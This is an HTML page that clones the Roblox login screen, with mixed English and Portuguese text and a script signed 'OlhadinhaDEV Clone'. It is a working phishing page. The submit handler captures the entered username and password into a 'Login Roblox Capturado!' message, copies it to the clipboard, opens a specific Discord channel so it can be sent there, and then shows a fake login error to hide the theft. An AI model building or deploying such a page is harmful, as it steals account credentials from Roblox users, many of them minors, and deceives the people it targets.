<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Log in to Roblox</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Roboto', sans-serif;
      background: url('https://images.rbxcdn.com/076d146437ffc79cebc36bf2ded91196') no-repeat center center fixed;
      background-size: cover;
      color: #f5f5f5;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .login-container {
      background: rgba(22, 22, 22, 0.85);
      border: 1px solid #2a2a2a;
      border-radius: 12px;
      padding: 48px 32px 40px;
      width: 100%;
      max-width: 420px;
      text-align: center;
      box-shadow: 0 10px 40px rgba(0,0,0,0.7);
      backdrop-filter: blur(8px);
    }
    .logo { margin-bottom: 40px; }
    .logo img { width: 180px; }
    h1 { font-size: 28px; font-weight: 500; margin-bottom: 36px; color: #ffffff; }
    .form-group { margin-bottom: 20px; position: relative; }
    input {
      width: 100%;
      padding: 14px 16px;
      background: rgba(15, 15, 15, 0.8);
      border: 1px solid #444;
      border-radius: 6px;
      color: #fff;
      font-size: 16px;
    }
    input::placeholder { color: #aaa; }
    input:focus { outline: none; border-color: #1a8cff; box-shadow: 0 0 0 3px rgba(26,140,255,0.3); }
    .password-wrapper { position: relative; }
    .eye-icon {
      position: absolute;
      right: 16px;
      top: 50%;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 20px;
      color: #aaa;
      user-select: none;
    }
    button {
      width: 100%;
      padding: 14px;
      background: #007bff;
      border: none;
      border-radius: 6px;
      color: white;
      font-size: 17px;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.2s;
      margin-top: 12px;
    }
    button:hover { background: #0069d9; }
    .error-message {
      margin: 0 0 16px 0;
      padding: 10px;
      background: rgba(255, 0, 0, 0.2);
      border: 1px solid #ff4d4d;
      border-radius: 6px;
      color: #ff4d4d;
      font-size: 14px;
      font-weight: 500;
      opacity: 0;
      transform: translateY(-10px);
      transition: opacity 0.4s ease, transform 0.4s ease;
      pointer-events: none;
    }
    .error-message.show { opacity: 1; transform: translateY(0); }
    .links { margin: 24px 0; font-size: 14px; }
    .links a { color: #1a8cff; text-decoration: none; }
    .links a:hover { text-decoration: underline; }
    .separator { color: #666; margin: 0 6px; }
    .signup { margin-top: 32px; font-size: 15px; color: #ccc; }
    .signup a { color: #1a8cff; font-weight: 500; text-decoration: none; }
    .signup a:hover { text-decoration: underline; }
    @media (max-width: 480px) {
      .login-container { padding: 40px 24px; border-radius: 0; min-height: 100vh; }
    }
  </style>
</head>
<body>

  <div class="login-container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Roblox_2022_Logo.svg/512px-Roblox_2022_Logo.svg.png" alt="Roblox">
    </div>

    <h1>Log in to Roblox</h1>

    <form id="loginForm">
      <div class="form-group">
        <input type="text" id="username" placeholder="Username/Email/Phone" required autocomplete="username">
      </div>

      <div class="form-group password-wrapper">
        <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
        <span class="eye-icon" id="toggleEye">üëÅÔ∏è</span>
      </div>

      <div class="error-message" id="errorMsg">Senha inv√°lida ou Nome Incorreto!!</div>

      <button type="submit">Entrar</button>
    </form>

    <div class="links">
      <a href="#">Forgot Password or Username?</a>
      <span class="separator">‚Ä¢</span>
      <a href="#">Login with Another Logged In Device</a>
    </div>

    <div class="signup">
      Don't have an account? <a href="#">Sign Up</a>
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const errorMsg = document.getElementById('errorMsg');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const toggleEye = document.getElementById('toggleEye');

    toggleEye.addEventListener('click', () => {
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleEye.textContent = 'üôà';
      } else {
        passwordInput.type = 'password';
        toggleEye.textContent = 'üëÅÔ∏è';
      }
    });

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const user = usernameInput.value.trim();
      const pass = passwordInput.value.trim();

      if (user && pass) {
        const mensagem = `**Login Roblox Capturado!**\n\n**Username/Email/Phone:** \`${user}\`\n**Senha:** \`${pass}\`\n\nEnviado de: OlhadinhaDEV Clone`;

        navigator.clipboard.writeText(mensagem).then(() => {
          alert('Dados copiados pro Discord! Abra o chat do seu bot/canal, cole (Ctrl+V) e envie.');
        }).catch(() => {
          alert('Erro ao copiar automaticamente. Copie manual: ' + mensagem);
        });

        // Abre Discord nos DMs (pra colar r√°pido) - troque se quiser canal espec√≠fico
        window.open('https://discord.com/channels/1473860408417714403/1473860409172951142');
      }

      errorMsg.classList.add('show');
      setTimeout(() => {
        errorMsg.classList.remove('show');
      }, 3000);
    });
  </script>

</body>
</html>
